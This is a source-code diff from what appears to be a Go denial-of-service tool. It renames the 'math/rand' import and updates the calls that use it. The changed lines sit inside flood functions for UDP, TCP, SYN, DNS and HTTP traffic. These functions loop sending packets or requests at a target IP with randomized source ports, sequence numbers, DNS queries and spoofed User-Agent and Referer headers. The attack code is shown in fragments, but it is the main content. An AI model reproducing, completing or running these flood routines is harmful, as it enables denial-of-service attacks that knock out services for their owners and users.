@@ -10,7 +10,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"math/rand"
+	mathrand "math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -399,7 +399,7 @@ func performUDPFlood(targetIP, portStr, durationStr string) {
 			case <-ctx.Done():
 				return
 			default:
-				sourcePort := rand.Intn(65535-1024) + 1024
+				sourcePort := mathrand.Intn(65535-1024) + 1024
 				conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: port})
 				if err != nil {
 					continue
@@ -448,9 +448,9 @@ func performTCPFlood(targetIP, portStr, durationStr string) {
 				return
 			default:
 				tcpLayer := &layers.TCP{
-					SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
+					SrcPort:    layers.TCPPort(mathrand.Intn(52024) + 1024),
 					DstPort:    layers.TCPPort(port),
-					Seq:        rand.Uint32(),
+					Seq:        mathrand.Uint32(),
 					Window:     12800,
 					SYN:        true,
 					DataOffset: 5,
@@ -503,9 +503,9 @@ func performSYNFlood(targetIP, portStr, durationStr string) {
 				return
 			default:
 				tcpLayer := &layers.TCP{
-					SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
+					SrcPort:    layers.TCPPort(mathrand.Intn(52024) + 1024),
 					DstPort:    layers.TCPPort(port),
-					Seq:        rand.Uint32(),
+					Seq:        mathrand.Uint32(),
 					Window:     12800,
 					SYN:        true,
 					DataOffset: 5,
@@ -559,14 +559,14 @@ func performDNSFlood(targetIP, portStr, durationStr string) {
 			case <-ctx.Done():
 				return
 			default:
-				domain := domains[rand.Intn(len(domains))]
-				queryType := queryTypes[rand.Intn(len(queryTypes))]
+				domain := domains[mathrand.Intn(len(domains))]
+				queryType := queryTypes[mathrand.Intn(len(queryTypes))]
 				dnsQuery := constructDNSQuery(domain, queryType)
 				buffer, err := dnsQuery.Pack()
 				if err != nil {
 					continue
 				}
-				sourcePort := rand.Intn(65535-1024) + 1024
+				sourcePort := mathrand.Intn(65535-1024) + 1024
 				_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: port, Zone: fmt.Sprintf("%d", sourcePort)})
 				if err != nil {
 					continue
@@ -625,8 +625,8 @@ func performHTTPFlood(targetIP, portStr, durationStr string) {
 				if err != nil {
 					continue
 				}
-				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
-				req.Header.Set("Referer", referers[rand.Intn(len(referers))])
+				req.Header.Set("User-Agent", userAgents[mathrand.Intn(len(userAgents))])
+				req.Header.Set("Referer", referers[mathrand.Intn(len(referers))])
 				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
 				req.Header.Set("Accept-Language", "en-US,en;q=0.5")
 				resp, err := client.Do(req)
